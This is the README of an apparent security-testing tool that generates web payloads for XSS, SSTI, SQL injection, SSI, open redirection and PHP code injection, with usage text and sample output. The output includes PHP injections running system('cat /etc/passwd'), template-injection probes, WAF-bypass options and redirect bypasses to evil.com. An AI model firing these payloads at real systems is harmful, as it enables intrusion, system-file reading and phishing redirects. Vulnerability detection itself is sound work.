# Payload Generator
Payload Generator Tool. These payloads are only help to detect the vulnerability. 

- [x] XSS Payload Generation
- [x] SSTI Payload Generation
- [ ] HTML Injection Payload Generation
- [x] Open Redirection Payload Generation
- [x] SQL Injection Payload Generation
- [ ] Command Injection Payload Generation
- [x] SSI Injection Payload Generation
- [x] PHP Code Injection Payload Generation



## XSS Payloads

### Help

```bash
usage: generator.py xss [-h] [--popup] [--logger] [--oast] [--dom] [--ored] [--oast-domain] [--unique-string] [--waf] [--reverse-payloads] [--urlencode]

options:
  -h, --help          show this help message and exit

XSS Payload Types:
  --popup             Generate Popup Payloads
  --logger            Generate Console.log() Payloads
  --oast              Generate OAST Payloads
  --dom               Generate DOM Payloads
  --ored              Generate ORED Payloads

XSS Payload Options:
  --oast-domain       Set OAST Domain for payloads
  --unique-string     Set Unique String for testing

XSS Payload Mutations:
  --waf               Generate WAF Bypass Payloads
  --reverse-payloads  Generate Reverse Payloads
  --urlencode         Set URL Encoding for payload generator
```

### Generate Popup Payloads

```bash
python3 generator.py xss --popup 
confirm("yDrQfNiA5EdYHhmJIWMw")
confirm`yDrQfNiA5EdYHhmJIWMw`
(confirm`yDrQfNiA5EdYHhmJIWMw`)
{confirm`yDrQfNiA5EdYHhmJIWMw`}
[confirm`yDrQfNiA5EdYHhmJIWMw`]
(((confirm)))`yDrQfNiA5EdYHhmJIWMw`
new class extends confirm`yDrQfNiA5EdYHhmJIWMw`{}
["yDrQfNiA5EdYHhmJIWMw"].find(confirm)
[1337].map(confirm)
<svg/onload="confirm("yDrQfNiA5EdYHhmJIWMw")">
[...]
```

## PHP

### Help

```bash
usage: generator.py php [-h] [--oast-domain] [--unique-string] [--sleep-timeout] [--urlencode]

options:
  -h, --help        show this help message and exit

PHP CI Payload Options:
  --oast-domain     Set OAST Domain for payloads
  --unique-string   Set Unique String for testing
  --sleep-timeout   Set Sleep Timeout

PHP Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```


### Generate Payloads

```bash
system("cat /etc/passwd")
system("cat /etc/passwd");
;system("cat /etc/passwd");
<?php system("cat /etc/passwd"); ?>
system("sleep 17")
system("sleep 17");
;system("sleep 17");
<?php system("sleep 17"); ?>
system("timeout /T 17")
system("timeout /T 17");
;system("timeout /T 17");
<?php system("timeout /T 17"); ?>
system("echo PLmyJkJgSdo5iQ9lDAnH")
system("echo PLmyJkJgSdo5iQ9lDAnH");
;system("echo PLmyJkJgSdo5iQ9lDAnH");
<?php system("echo PLmyJkJgSdo5iQ9lDAnH"); ?>
[...]
```


## Open Redirection (ORED)

### Help

```bash
usage: generator.py ored [-h] [--oast-domain] [--unique-string] [--whitelisted-domain] [--xss-payloads] [--urlencode]

options:
  -h, --help            show this help message and exit

Open Redirection Payload Options:
  --oast-domain         Set OAST Domain for payloads
  --unique-string       Set Unique String for testing
  --whitelisted-domain 
                        Set Whitelisted domain for testing
  --xss-payloads        Generate XSS Payloads

Open Redirection Payload Mutations:
  --urlencode           Set URL Encoding for payload generator
```

### Generate Payloads

```bash
python3 generator.py ored --oast-domain evil.com --whitelisted-domain github.com
/〱evil.com
〱evil.com
/〵evil.com
〵evil.com
/ゝevil.com
ゝevil.com
/ーevil.com
ーevil.com
/ｰevil.com
ｰevil.com
/%09/evil.com
//%09/evil.com
///%09/evil.com
////%09/evil.com
/%09/evil.com@evil.com
//%09/evil.com@evil.com
///%09/evil.com@evil.com
////%09/evil.com@evil.com
/%09/github.com@evil.com
//%09/github.com@evil.com
///%09/github.com@evil.com
////%09/github.com@evil.com
```

## Server-Side Template Injection (SSTI)

### Usage

```bash
usage: generator.py ssti [-h] [--reflective] [--oast] [--timeout] [--oast-domain] [--unique-string] [--sleep-timeout] [--number] [--multiply] [-w] [-l] [--urlencode]

options:
  -h, --help        show this help message and exit

Service-Side Template Injection Payload Types:
  --reflective      Generate reflective payloads
  --oast            Generate OAST payloads
  --timeout         Generate Time-Based payloads

Service-Side Template Injection Payload Options:
  --oast-domain     Set OAST Domain for payloads
  --unique-string   Set Unique String for testing
  --sleep-timeout   Set Sleep Timeout for payload genrating
  --number          Set number for payload genrating
  --multiply        Set string multiply number for payload genrating

SSTI Platform Options:
  -w, --windows     Generate Windows Based payloads
  -l, --linux       Generate Linux Based payloads

Server Side Template Injection Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```


### Generate Payloads

```bash
python3 generator.py ssti --timeout --linux                   
@{@:dML9BHG7cEaAjv3sMyXQ}
{{7*"dML9BHG7cEaAjv3sMyXQ"}}
<%=1337*1337%>
{1337*1337}
${"1337"+"1337"}
<%"1337"+"1337"%>
{system('sleep 15')}
#{7*"dML9BHG7cEaAjv3sMyXQ"}
${7*"dML9BHG7cEaAjv3sMyXQ"}
{"1337"+"1337"}
{php}sleep 15;{/php}
{{1337*1337}}
<%7*"dML9BHG7cEaAjv3sMyXQ"%>
@{Response.Write("dML9BHG7cEaAjv3sMyXQ");}
<%1337*1337%>
```

## SQL Injection

### Help

```bash
usage: generator.py sqli [-h] [--error-based] [--time-based] [--union-based] [--auth-bypass] [--sleep-timeout]

options:
  -h, --help        show this help message and exit

SQL Injection Payload Types:
  --error-based     Generate Error Based payloads
  --time-based      Generate Time Based payloads
  --union-based     Generate Union Based payloads
  --auth-bypass     Generate Auth Bypass payloads

SQL Injection Payload Options:
  --sleep-timeout   Set Sleep Timeout for payload genrating
```


## Server-Side Script Include (SSI)


### Help

```bash
usage: generator.py ssi [-h] [--reflective] [--time-based] [--oast] [--sleep-timeout] [--oast-domain] [--unique-string] [-w] [-l] [--urlencode]

options:
  -h, --help        show this help message and exit

SSI Payload Types:
  --reflective      Generate Reflective payloads
  --time-based      Generate Time Based payloads
  --oast            Generate OAST payloads

SSI Payload Options:
  --sleep-timeout   Set Sleep Timeout for payload genrating
  --oast-domain     Set OAST Domain for payload genrating
  --unique-string   Set Unique string for payload genrating

SSI Platform Options:
  -w, --windows     Generate Windows Based payloads
  -l, --linux       Generate Linux Based payloads

SSI Payload Mutations:
  --urlencode       Set URL Encoding for payload generator
```
